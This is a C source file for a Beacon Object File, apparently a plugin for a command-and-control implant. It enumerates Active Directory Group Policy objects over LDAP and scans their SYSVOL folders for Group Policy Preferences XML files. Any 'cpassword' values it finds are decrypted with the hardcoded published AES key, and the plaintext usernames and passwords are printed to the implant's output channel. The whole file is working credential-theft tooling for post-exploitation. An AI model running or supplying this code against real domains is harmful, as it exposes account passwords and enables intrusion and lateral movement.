/*
 * bof-gpocheck
 *
 * Enumerate Group Policy objects and their links, then scan each GPO's SYSVOL
 * directory for Preferences XML files containing `cpassword`.  Any cpassword
 * found is base64-decoded and decrypted with the published AES-256 GPP key.
 *
 * Everything is read with the current user's token (domain users can read
 * SYSVOL by default).  Output is GPO name, link target, file and the
 * decrypted credential.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "ldaphelpers.h"

/* Published Microsoft GPP AES-256 key. */
static const unsigned char gpp_key[32] = {
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
    0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
    0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b
};

static int gpp_decrypt(const char *b64, char *out, int outsz)
{
    unsigned char data[4096];
    unsigned char plain[4096];
    unsigned char iv[16];
    unsigned char obj[256];
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE key = NULL;
    DWORD objlen = 0, outlen = 0;
    int n, i, o = 0;

    out[0] = 0;
    n = bof_b64_decode(b64, data, sizeof(data));
    if (n <= 0 || (n % 16) != 0) return -1;

    if (BCRYPT$BCryptOpenAlgorithmProvider(&alg, L"AES", NULL, 0) < 0) return -1;
    if (BCRYPT$BCryptSetProperty(alg, L"ChainingMode",
                                 (PUCHAR)L"CBC", (ULONG)sizeof(L"CBC"), 0) < 0)
        goto cleanup;
    if (BCRYPT$BCryptGetProperty(alg, L"ObjectLength", obj, sizeof(obj),
                                 (PULONG)&objlen, 0) < 0)
        goto cleanup;
    if (objlen > sizeof(obj)) objlen = sizeof(obj);
    bof_memzero(iv, sizeof(iv));
    if (BCRYPT$BCryptGenerateSymmetricKey(alg, &key, obj, objlen,
                                          (PUCHAR)gpp_key, sizeof(gpp_key), 0) < 0)
        goto cleanup;
    if (BCRYPT$BCryptDecrypt(key, data, (ULONG)n, NULL, iv, sizeof(iv),
                             plain, sizeof(plain), (PULONG)&outlen,
                             BCRYPT_BLOCK_PADDING) < 0)
        goto cleanup;

    /* GPP stores UTF-16LE; strip trailing NULs. */
    while (outlen >= 2 && plain[outlen - 1] == 0 && plain[outlen - 2] == 0)
        outlen -= 2;
    if ((outlen % 2) != 0) outlen--;
    for (i = 0; i + 1 < (int)outlen && o < outsz - 1; i += 2) {
        unsigned short wc = (unsigned short)(plain[i] | (plain[i + 1] << 8));
        if (wc == 0) break;
        out[o++] = (wc < 0x80) ? (char)wc : '?';
    }
    out[o] = 0;

    if (key) BCRYPT$BCryptDestroyKey(key);
    if (alg) BCRYPT$BCryptCloseAlgorithmProvider(alg, 0);
    return out[0] ? 0 : -1;

cleanup:
    if (key) BCRYPT$BCryptDestroyKey(key);
    if (alg) BCRYPT$BCryptCloseAlgorithmProvider(alg, 0);
    return -1;
}

static int ci_find(const unsigned char *buf, unsigned int len,
                   const char *needle, unsigned int start)
{
    unsigned int n = (unsigned int)bof_strlen(needle), i;
    if (!n || len < n) return -1;
    for (i = start; i + n <= len; i++) {
        unsigned int j;
        for (j = 0; j < n; j++) {
            unsigned char a = buf[i + j], b = (unsigned char)needle[j];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) break;
        }
        if (j == n) return (int)i;
    }
    return -1;
}

/* Extract the quoted value after attr= starting at/after `from`. */
static int quoted_value(const unsigned char *buf, unsigned int len,
                        const char *attr, unsigned int from,
                        char *out, int outsz)
{
    int at = ci_find(buf, len, attr, from);
    unsigned int i;
    int o = 0;

    out[0] = 0;
    if (at < 0) return -1;
    i = (unsigned int)at + (unsigned int)bof_strlen(attr);
    while (i < len && (buf[i] == ' ' || buf[i] == '"' || buf[i] == '=')) i++;
    if (i >= len) return -1;
    if (buf[i] == '"' || buf[i] == '\'') {
        unsigned char q = buf[i++];
        while (i < len && buf[i] != q && o < outsz - 1) out[o++] = (char)buf[i++];
    } else {
        while (i < len && buf[i] != '"' && buf[i] != '\'' && buf[i] != ' ' &&
               buf[i] != '>' && o < outsz - 1)
            out[o++] = (char)buf[i++];
    }
    out[o] = 0;
    return o > 0 ? 0 : -1;
}

static void scan_cpassword(const char *file, const char *gpo)
{
    unsigned char *buf = NULL;
    unsigned int len = 0, at = 0;
    int hits = 0;

    if (bof_read_file(file, &buf, &len) != 0 || !buf) return;

    while (at < len && hits < 20) {
        int pos = ci_find(buf, len, "cpassword", at);
        char b64[1024], user[256], pw[256];
        unsigned int back;

        if (pos < 0) break;
        at = (unsigned int)pos + 8;
        if (quoted_value(buf, len, "cpassword", (unsigned int)pos,
                         b64, sizeof(b64)) != 0)
            continue;
        if (!b64[0]) continue;

        user[0] = 0;
        back = (pos > 512) ? (unsigned int)pos - 512 : 0;
        if (quoted_value(buf, len, "userName", back, user, sizeof(user)) != 0)
            quoted_value(buf, len, "name", back, user, sizeof(user));

        if (gpp_decrypt(b64, pw, sizeof(pw)) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [+] %s\n", file);
            BeaconPrintf(CALLBACK_OUTPUT, "      gpo      : %s\n", gpo);
            if (user[0])
                BeaconPrintf(CALLBACK_OUTPUT, "      user     : %s\n", user);
            BeaconPrintf(CALLBACK_OUTPUT, "      cpassword: %s\n", b64);
            BeaconPrintf(CALLBACK_OUTPUT, "      password : %s\n", pw);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  [!] cpassword (decrypt failed) in %s\n", file);
        }
        hits++;
    }

    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}

static void scan_gpo_dir(const char *dir, const char *gpo, int depth)
{
    char pattern[MAX_PATH * 2];
    WIN32_FIND_DATAA fd;
    HANDLE h;

    if (depth > 8) return;
    bof_strncpy(pattern, dir, sizeof(pattern));
    bof_strncat(pattern, "\\*", sizeof(pattern) - bof_strlen(pattern) - 1);
    h = KERNEL32$FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        char child[MAX_PATH * 2];
        if (bof_strcmp(fd.cFileName, ".") == 0 ||
            bof_strcmp(fd.cFileName, "..") == 0) continue;
        bof_strncpy(child, dir, sizeof(child));
        bof_strncat(child, "\\", sizeof(child) - bof_strlen(child) - 1);
        bof_strncat(child, fd.cFileName, sizeof(child) - bof_strlen(child) - 1);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            scan_gpo_dir(child, gpo, depth + 1);
        } else {
            int n = bof_strlen(fd.cFileName);
            if (n > 4 && bof_stricmp(fd.cFileName + n - 4, ".xml") == 0)
                scan_cpassword(child, gpo);
        }
    } while (KERNEL32$FindNextFileA(h, &fd));

    KERNEL32$FindClose(h);
}

static void print_links(LDAP *ld, char *base, const char *label)
{
    PCHAR attrs[3];
    LDAPMessage *res = NULL;
    LDAPMessage *e;
    ULONG rc;
    int count = 0;

    attrs[0] = "distinguishedName";
    attrs[1] = "gpLink";
    attrs[2] = NULL;

    rc = WLDAP32$ldap_search_ext_sA(ld, base, LDAP_SCOPE_SUBTREE, "(gpLink=*)",
                                    attrs, 0, NULL, NULL, NULL, 500, &res);
    if (rc != LDAP_SUCCESS) return;

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] GPO links (%s)\n", label);
    for (e = WLDAP32$ldap_first_entry(ld, res); e;
         e = WLDAP32$ldap_next_entry(ld, e)) {
        char dn[512];
        struct berval **v;
        if (bof_ldap_get_str(ld, e, "distinguishedName", dn, sizeof(dn)) != 0)
            continue;
        BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", dn);
        v = WLDAP32$ldap_get_values_lenA(ld, e, "gpLink");
        if (v) {
            ULONG i;
            for (i = 0; v[i]; i++) {
                char link[768];
                ULONG n = v[i]->bv_len < sizeof(link) - 1 ? v[i]->bv_len : sizeof(link) - 1;
                bof_memcpy(link, v[i]->bv_val, n);
                link[n] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "      %s\n", link);
            }
            WLDAP32$ldap_value_free_len(v);
        }
        count++;
    }
    WLDAP32$ldap_msgfree(res);
    if (!count) BeaconPrintf(CALLBACK_OUTPUT, "  (none)\n");
}

void go(char *args, int alen)
{
    char base[512], config[512];
    LDAP *ld;
    PCHAR attrs[4];
    LDAPMessage *res = NULL;
    LDAPMessage *e;
    ULONG rc;
    int count = 0;

    (void)args; (void)alen;

    ld = bof_ldap_open();
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "LDAP connect/bind failed\n");
        return;
    }
    if (bof_ldap_default_nc(ld, base, sizeof(base)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "could not read defaultNamingContext\n");
        WLDAP32$ldap_unbind(ld);
        return;
    }
    bof_ldap_config_nc(ld, config, sizeof(config));

    BeaconPrintf(CALLBACK_OUTPUT, "================ GPO check ================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] domain: %s\n", base);

    attrs[0] = "displayName";
    attrs[1] = "gPCFileSysPath";
    attrs[2] = "distinguishedName";
    attrs[3] = NULL;

    {
        char policies[768];
        bof_strncpy(policies, "CN=Policies,CN=System,", sizeof(policies));
        bof_strncat(policies, base, sizeof(policies) - bof_strlen(policies) - 1);
        rc = WLDAP32$ldap_search_ext_sA(ld, policies, LDAP_SCOPE_ONELEVEL,
                                        "(objectClass=groupPolicyContainer)",
                                        attrs, 0, NULL, NULL, NULL, 500, &res);
    }

    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "GPO search failed: %lu (%s)\n",
                     (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));
    } else {
        for (e = WLDAP32$ldap_first_entry(ld, res); e;
             e = WLDAP32$ldap_next_entry(ld, e)) {
            char name[256], path[MAX_PATH], dn[512];

            if (bof_ldap_get_str(ld, e, "displayName", name, sizeof(name)) != 0)
                bof_strcpy(name, "(unnamed)");
            if (bof_ldap_get_str(ld, e, "gPCFileSysPath", path, sizeof(path)) != 0)
                path[0] = 0;
            if (bof_ldap_get_str(ld, e, "distinguishedName", dn, sizeof(dn)) != 0)
                dn[0] = 0;

            BeaconPrintf(CALLBACK_OUTPUT, "\n[GPO] %s\n", name);
            if (dn[0])   BeaconPrintf(CALLBACK_OUTPUT, "  dn  : %s\n", dn);
            if (path[0]) {
                BeaconPrintf(CALLBACK_OUTPUT, "  path: %s\n", path);
                scan_gpo_dir(path, name, 0);
            }
            count++;
        }
        WLDAP32$ldap_msgfree(res);
    }

    print_links(ld, base, "domain/OU");
    if (config[0]) {
        char sites[768];
        bof_strncpy(sites, "CN=Sites,", sizeof(sites));
        bof_strncat(sites, config, sizeof(sites) - bof_strlen(sites) - 1);
        print_links(ld, sites, "sites");
    }

    WLDAP32$ldap_unbind(ld);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d GPO(s) inspected\n", count);
}
